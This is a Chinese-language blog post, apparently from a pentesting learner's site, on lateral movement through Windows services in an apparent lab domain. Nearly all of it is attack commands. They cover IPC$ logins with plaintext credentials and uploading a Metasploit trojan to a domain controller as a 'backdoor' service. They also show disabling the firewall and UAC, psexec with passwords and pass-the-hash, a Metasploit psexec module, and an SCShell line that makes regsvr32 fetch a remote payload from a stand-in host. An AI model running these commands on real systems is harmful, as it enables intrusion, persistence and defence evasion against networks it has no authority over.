@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="𝐴_𝑌𝑢">
+
+
+
+
+
+<title>利用SC服务横向移动 | 𝓐_𝚼𝓾ʹ𝒔 𝓑ℓ𝖔𝓰</title>
+
+
+
+    <link rel="icon" href="/image/favicon.svg">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1614813_fp9wxdcpr9c.css"
+<meta name="generator" content="Hexo 6.1.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">𝔸_𝕐𝕌ʹ𝕤 𝔹𝕀💿𝔾</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">
+                        
+                            <i class="iconfont icon-archives "></i>
+                        
+                        
+                        
+                        
+                        文章
+                    </a>
+                
+                    <a class="menu-item" href="/category">
+                        
+                        
+                            <i class="iconfont icon-categorys "></i>
+                        
+                        
+                        
+                        分类
+                    </a>
+                
+                    <a class="menu-item" href="/tag">
+                        
+                        
+                        
+                            <i class="iconfont icon-tags "></i>
+                        
+                        
+                        标签
+                    </a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">𝔸_𝕐𝕌ʹ𝕤 𝔹𝕀💿𝔾</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; 菜单</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">
+                        
+                            <i class="iconfont icon-archives "></i>
+                        
+                        
+                        
+                        
+                        文章
+                    </a>
+                
+                    <a class="menu-item" href="/category">
+                        
+                        
+                            <i class="iconfont icon-categorys "></i>
+                        
+                        
+                        
+                        分类
+                    </a>
+                
+                    <a class="menu-item" href="/tag">
+                        
+                        
+                        
+                            <i class="iconfont icon-tags "></i>
+                        
+                        
+                        标签
+                    </a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">▶︎ 展开目录</a>
+    </div>
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a onclick="go_top()">△ 顶部</a>
+        <a onclick="go_bottom()">▽ 底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "▼ 收起目录"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "▶︎ 展开目录"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">利用SC服务横向移动</h1>
+            
+                <div class="post-meta">
+                    
+                        <!--作者:-->
+                        <i class="iconfont icon-user"></i>
+                        <a itemprop="author" rel="author" href="/">𝐴_𝑌𝑢 </a> &nbsp;
+                    
+
+                    
+                        <span class="post-time">
+                        <!--发布时间:-->
+                        <i class="iconfont icon-time"></i>
+                        <a href="#">2022-05-06&nbsp;&nbsp;10:53:50</a> &nbsp;
+                        </span>
+                    
+                    
+                    
+                    <span id="/2022/05/06/22-0506-02/" class="leancloud-visitors view" data-flag-title="利用SC服务横向移动">
+                        <text class="post-meta-item-text">
+                            <!--阅读数:-->
+                            <i class="iconfont icon-view"></i>
+                        </text>
+                        
+                        <text class="leancloud-visitors-count">加载中</text>
+                      </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>SC即（services Configuration）服务管理配置，我们可以通过<code>运行—services.msc</code>查看、开启和关闭一些服务</p>
+<img src="/2022/05/06/22-0506-02/image-20220506110653802.png" alt="image-20220506110653802" style="zoom:80%;">
+
+
+
+<p>但如何添加或删除一些服务呢？</p>
+<p>在windows系统命令提示符中，有一个SC工具命令集（sc.exe）。该工具集主要用来对操作系统服务进行管理。例如：把下面的计算器calc.exe添加到服务中</p>
+<img src="/2022/05/06/22-0506-02/image-20220506112113935.png" alt="image-20220506112113935" style="zoom:80%;">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create calc_service binPath=C:\Users\xxy\Desktop\calc.exe4</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/06/22-0506-02/image-20220506204525967.png" alt="image-20220506204525967" style="zoom:80%;">
+
+<p>
+
+<img src="/2022/05/06/22-0506-02/image-20220506204548771.png" alt="image-20220506204548771" style="zoom:80%;">
+
+</p><p>然后手动启动服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start calc_service </span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/06/22-0506-02/image-20220506204633883.png" alt="image-20220506204633883" style="zoom:80%;">
+
+<p>
+
+<img src="/2022/05/06/22-0506-02/image-20220506204711817.png" alt="image-20220506204711817" style="zoom:80%;">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">其它命令:</span><br><span class="line">sc stop calc_service       //停止服务</span><br><span class="line">sc delete calc_service     //删除服务</span><br></pre></td></tr></table></figure>
+
+</p><h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><img src="/2022/05/06/22-0506-02/image-20220505093329099.png" alt="image-20220505093329099" style="zoom:80%;">
+
+<h1 id="sc-exe"><a href="#sc-exe" class="headerlink" title="sc.exe"></a>sc.exe</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">web服务器和域控建立ipc连接</span><br><span class="line">net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\administrator</span><br><span class="line">利用copy命令上传msf木马</span><br><span class="line">copy msf.exe \\192.168.3.21\c$</span><br><span class="line">利用sc.exe创建&quot;backdoor&quot;服务（需要高权限）</span><br><span class="line">sc \\192.168.43.21 create backdoor binpath=&quot;c:\msf.exe&quot;</span><br><span class="line">启动服务</span><br><span class="line">sc \\192.168.43.21 start backdoor</span><br><span class="line">删除服务</span><br><span class="line">sc \\192.168.43.21 delete backdoor</span><br><span class="line"></span><br><span class="line">扩展:关闭防火墙</span><br><span class="line">sc \\192.168.3.21 create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line">sc \\192.168.321 start unablefirewall</span><br><span class="line"></span><br><span class="line">扩展:OpenSCManager失败5:拒绝访问原因:</span><br><span class="line">运行--&gt;输入regedit--&gt;依次找到HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA</span><br><span class="line">将EnableLUA的值改为0，最后重启电脑，再次操作</span><br><span class="line">EnableLUA 指定当程序尝试对计算机进行更改时是否将 Windows 用户帐户控制 (UAC) 通知用户。</span><br><span class="line">true(1)：当程序尝试对计算机进行更改时，Windows 会通知用户。这是默认值。</span><br><span class="line">false(0)：当程序尝试安装软件或对计算机进行更改时，Windows 不会通知用户</span><br></pre></td></tr></table></figure>
+
+<h1 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">执行原理：</span><br><span class="line">1.通过ipc$连接，释放psexecsvc.exe到目标。</span><br><span class="line">2.通过服务管理SCManager远程创建psexecsvc服务，并启动服务。</span><br><span class="line">3.客户端连接执行命令，服务端启动相应的程序并执行回显数据。</span><br><span class="line">4.运行完后删除服务。这个在windows的日志中有详细的记录，另外psexec在少数情况下会出现服务没删除成功的bug，所以一般不推荐使用psexec，推荐wmiexec</span><br><span class="line"></span><br><span class="line">#建立ipc然后再用psexec连接</span><br><span class="line">net use \\192.168.3.32\admin$ &quot;admin!@#45&quot; /user:192.168.43.32\dbadmin</span><br><span class="line">psexec \\192.168.3.32 cmd</span><br><span class="line"></span><br><span class="line">#直接用psexec连接</span><br><span class="line">psexec \\192.168.3.32 -u ./administrator -p admin!@#45 -s cmd</span><br><span class="line"></span><br><span class="line">#通过hash连接</span><br><span class="line">psexec -hashes:518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 cmd</span><br><span class="line"></span><br><span class="line">msf中psexec</span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set RHOST 192.168.3.32   </span><br><span class="line">set smbuser administrator </span><br><span class="line">set smbpass admin!@#45</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">目标机器开启UAC会失败，关闭UAC</span><br><span class="line">reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
+
+<h1 id="sharpmove"><a href="#sharpmove" class="headerlink" title="sharpmove"></a>sharpmove</h1><p><a target="_blank" rel="noopener" href="https://github.com/0xthirteen/SharpMove">https://github.com/0xthirteen/SharpMove</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">创建服务TestService</span><br><span class="line">SharpMove.exe action=startservice computername=remote.host.local servicename=TestService</span><br><span class="line">更多用法详见https://github.com/0xthirteen/SharpMove</span><br></pre></td></tr></table></figure>
+
+<h1 id="csexec"><a href="#csexec" class="headerlink" title="csexec"></a>csexec</h1><p><a target="_blank" rel="noopener" href="https://github.com/malcomvetter/CSExec">https://github.com/malcomvetter/CSExec</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.21\admin$ &quot;Admin12345&quot; /user:god.org\administrator</span><br><span class="line">csexec \\192.168.3.21 cmd.exe</span><br></pre></td></tr></table></figure>
+
+<h1 id="scshell"><a href="#scshell" class="headerlink" title="scshell"></a>scshell</h1><p><a target="_blank" rel="noopener" href="https://github.com/Mr-Un1k0d3r/SCShell">https://github.com/Mr-Un1k0d3r/SCShell</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SCShell.exe 192.168.197.131 XblAuthManager &quot;C:\windows\system32\cmd.exe /c C:\windows\system32\regsvr32.exe /s /n /u /i://your.website/payload.sct scrobj.dll&quot; . administrastor Password</span><br><span class="line">#XblAuthManager 是 Xbox Accessory Management Service的服务名</span><br><span class="line">#regsvr32.exe用于注册Windows操作系统的动态链接库和ActiveX控件</span><br></pre></td></tr></table></figure>
+
+<h1 id="sharpexec"><a href="#sharpexec" class="headerlink" title="sharpexec"></a>sharpexec</h1><p><a target="_blank" rel="noopener" href="https://github.com/anthemtotheego/SharpExec">https://github.com/anthemtotheego/SharpExec</a></p>
+
+        </div>		
+		
+        <section class="post-tags">
+            <div>
+                <span>标签:</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="/">
+                    <i class="iconfont icon-home"></i>
+                    主页
+                </a>
+                <span>· </span>
+                <a href="javascript:window.history.back();">
+                    <i class="iconfont icon-back"></i>
+                    返回
+                </a>
+                
+                
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2022/05/07/22-0507-01/">vulhub靶机—connect-the-dots</a>
+            
+            
+            <a class="next" rel="next" href="/2022/05/06/22-0506-01/">tcp/ip网络编程（期末考试）</a>
+            
+        </section>
+        <br>
+        
+            <section id="comments" class="comments">
+              <style>
+                  .comments{ margin-top: 30px;}
+                  .v .vlist .vcard .vcontent {padding-top: 0;}
+                  .vcontent p { color:grey; margin-bottom: 10px;}
+                  .v * {line-height: normal;}
+                  .v .vwrap  {border-radius: 0px; padding: 10px;}
+                  .v .vbtn {border-radius: 0px;}
+                  .v code, .v pre {border-radius: 0px;}
+                  .v .vlist .vcard .vhead .vsys {border-radius: 1px; padding: 2px;}
+                  .v .vlist .vcard .vhead .vnick {color: #2d96bd;}
+                  .v .vlist .vcard .vh .vmeta .vat{color: #c7254e;}
+                  .v .vlist .vcard {padding-top: 0;}
+                  .v .vlist .vcard .vimg { width: 2.5em; height: 2.5em; }
+                  .v .vlist .vcard .vquote .vimg { width: 2.5em; height: 2.5em; }
+              </style>
+              <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+    new Valine({
+        app_id: 'baahrwTTyOayDYUv5AtkdGJj-gzGzoHsz',
+        app_key: 'iTfzn8X60g9v0zTtnvToc09l',
+        placeholder: '想对作者说点什么...',
+        notify: 'false',
+        verify: 'false',
+        avatar: 'retro',
+        visitor: 'true'
+    });
+</script>
+            </section>
+        
+    </article>
+</div>
+
+
+
+<style>
+
+.post-wrap { table-layout:fixed; word-break:break-all; overflow:hidden; }
+
+</style>
+        </div>
+        <footer id="footer" class="footer">
+
+ <div class="copyright">
+
+ <span>© 𝐴_𝑌𝑢
+
+ <!-- 访客数量 -->
+
+ 
+
+ <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    | 总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"><i class="fa fa-spinner fa-spin"></i></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    | 总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></i>
+</span>
+
+
+ 
+
+ </span>
+
+ </div>
+
+</footer>
+    </div>
+</body>
+</html>
